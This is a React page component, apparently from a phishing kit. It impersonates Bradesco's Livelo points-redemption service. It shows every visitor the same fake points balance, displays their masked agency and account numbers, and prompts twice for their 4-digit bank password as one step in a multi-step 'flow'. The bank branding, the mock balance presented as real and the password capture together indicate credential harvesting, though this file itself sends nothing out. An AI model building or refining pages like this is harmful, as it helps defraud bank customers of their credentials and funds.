import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { ArrowRight, Loader2 } from "lucide-react";
import LottieBackground from "@/components/LottieBackground";
import { getSegmentLogo } from "@/lib/segment-config";
import { segmentButtonStyle, getSegmentColor } from "@/lib/segment-colors";
import UserInfoCard from "@/components/redeem/UserInfoCard";
import RedemptionOptions, { type RedeemOption } from "@/components/redeem/RedemptionOptions";
import PreviewCard from "@/components/redeem/PreviewCard";
import PasswordModal from "@/components/redeem/PasswordModal";
import { useFlowNavigation } from "@/hooks/useFlowNavigation";
import liveloLogo from "@/assets/livelo-logo-2.png";

const MOCK_POINTS = 120425;

const RedeemPage = () => {
  const navigate = useNavigate();
  const { data } = useFlow();
  const { steps, getNextStep } = useFlowNavigation();
  const [selectedOption, setSelectedOption] = useState<RedeemOption>(null);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [isNavigating, setIsNavigating] = useState(false);
  const [pin, setPin] = useState("");
  const [confirmPin, setConfirmPin] = useState("");
  const [step, setStep] = useState<"enter" | "confirm">("enter");
  const [error, setError] = useState("");

  const displayName = data.nome || "Cliente";
  const segmentLogo = getSegmentLogo(data.segment);
  const segColor = getSegmentColor(data.segment);
  const maskedAgency = data.agency ? `**${data.agency.slice(-2)}` : "**00";
  const maskedAccount = data.account ? `***${data.account.slice(-3)}` : "***000";

  // Dynamic progress derived from flow config
  const currentStepIdx = steps.findIndex((s) => s.step_key === "resgate");
  const progressStep = currentStepIdx >= 0 ? currentStepIdx + 1 : 3;
  const progressTotal = steps.length > 0 ? steps.length : 7;

  useEffect(() => {
    if (!data.cpf) navigate("/");
  }, [data.cpf, navigate]);

  const handleSelect = (option: "fatura" | "conta") => {
    setSelectedOption(option);
    localStorage.setItem("redeem_option", option);
  };

  const handleConfirmPassword = () => {
    if (step === "enter") {
      if (pin.length !== 4) {
        setError("Informe os 4 dígitos da senha");
        return;
      }
      setStep("confirm");
      setError("");
      return;
    }
    if (confirmPin.length !== 4) {
      setError("Confirme os 4 dígitos da senha");
      return;
    }
    if (pin !== confirmPin) {
      setError("As senhas não coincidem");
      setConfirmPin("");
      return;
    }
    setShowPasswordModal(false);
    setPin("");
    setConfirmPin("");
    setStep("enter");
    setError("");
    setIsNavigating(true);
    navigate(getNextStep("resgate"));
  };

  const handleModalClose = (open: boolean) => {
    setShowPasswordModal(open);
    if (!open) {
      setPin("");
      setConfirmPin("");
      setStep("enter");
      setError("");
    }
  };

  return (
    <div className="relative flex min-h-screen flex-col px-6 py-8">
      <LottieBackground segment={data.segment} />

      {/* Header */}
      <div className="relative z-10 flex items-center mb-4">
        <img src={segmentLogo} alt="Bradesco" className="w-[120px] h-auto object-contain brightness-0 invert" />
      </div>

      {/* Progress */}
      <div className="relative z-10 mb-6">
        <div className="flex items-center justify-between mb-1.5">
          <p className="text-xs text-white/50 font-medium">
            Passo {progressStep} de {progressTotal}
          </p>
          <p className="text-xs font-semibold" style={{ color: segColor }}>
            {Math.round((progressStep / progressTotal) * 100)}%
          </p>
        </div>
        <div className="h-1.5 w-full rounded-full bg-white/15 overflow-hidden">
          <div
            className="h-full rounded-full transition-all duration-700"
            style={{ width: `${(progressStep / progressTotal) * 100}%`, backgroundColor: segColor }}
          />
        </div>
      </div>

      {/* Hero Card — Livelo logo + pontos */}
      <div className="relative z-10 mb-4 animate-slide-up-fade">
        <div className="rounded-2xl border border-white/25 bg-white/85 backdrop-blur-md shadow-xl overflow-hidden">
          <div className="h-0.5" style={{ backgroundColor: segColor }} />
          <div className="px-5 pt-5 pb-5">
            <img
              src={liveloLogo}
              alt="Livelo"
              className="h-16 w-auto object-contain mb-4"
            />
            <div className="h-px bg-border mb-4" />
            <p className="text-5xl font-extrabold text-foreground leading-none tracking-tight">
              {MOCK_POINTS.toLocaleString("pt-BR")}
              <span className="text-2xl font-semibold ml-2" style={{ color: segColor }}>pts</span>
            </p>
            <p className="text-sm text-muted-foreground mt-1.5 font-medium">
              ≈ R$ {(MOCK_POINTS * 0.01).toLocaleString("pt-BR", { minimumFractionDigits: 2 })} disponíveis para resgate
            </p>
          </div>
        </div>
      </div>

      {/* User Info Card */}
      <UserInfoCard
        displayName={displayName}
        maskedAgency={maskedAgency}
        maskedAccount={maskedAccount}
        points={MOCK_POINTS}
        segColor={segColor}
      />

      {/* Redemption Options */}
      <RedemptionOptions selectedOption={selectedOption} onSelect={handleSelect} segColor={segColor} />

      {/* Preview Card */}
      {selectedOption && <PreviewCard option={selectedOption} points={MOCK_POINTS} segColor={segColor} />}

      {/* CTA Button */}
      <div className="relative z-10 mt-auto pt-4">
        <button
          disabled={!selectedOption || isNavigating}
          onClick={() => setShowPasswordModal(true)}
          className="flex h-14 w-full items-center justify-center gap-2 rounded-full text-base font-semibold transition-all duration-300 active:scale-[0.98] disabled:cursor-not-allowed"
          style={
            selectedOption && !isNavigating
              ? {
                  ...segmentButtonStyle(data.segment),
                  boxShadow: `0 8px 28px ${segColor}55, 0 2px 8px ${segColor}30`,
                }
              : {
                  backgroundColor: "rgba(255,255,255,0.12)",
                  color: "rgba(255,255,255,0.4)",
                  border: "1.5px solid rgba(255,255,255,0.2)",
                }
          }
          aria-label="Continuar para confirmação"
        >
          {isNavigating ? (
            <Loader2 className="h-5 w-5 animate-spin" />
          ) : (
            <>
              Continuar para confirmação
              <ArrowRight className="h-5 w-5" />
            </>
          )}
        </button>
      </div>

      {/* Password Modal */}
      <PasswordModal
        open={showPasswordModal}
        onOpenChange={handleModalClose}
        pin={step === "enter" ? pin : confirmPin}
        onPinChange={(value) => {
          if (step === "enter") setPin(value);
          else setConfirmPin(value);
          setError("");
        }}
        error={error}
        onConfirm={handleConfirmPassword}
        segment={data.segment}
        title={step === "enter" ? "Confirme seu resgate" : "Confirme a senha"}
        description={step === "enter" ? "Digite sua senha de 4 dígitos" : "Digite novamente para confirmar"}
      />
    </div>
  );
};

export default RedeemPage;
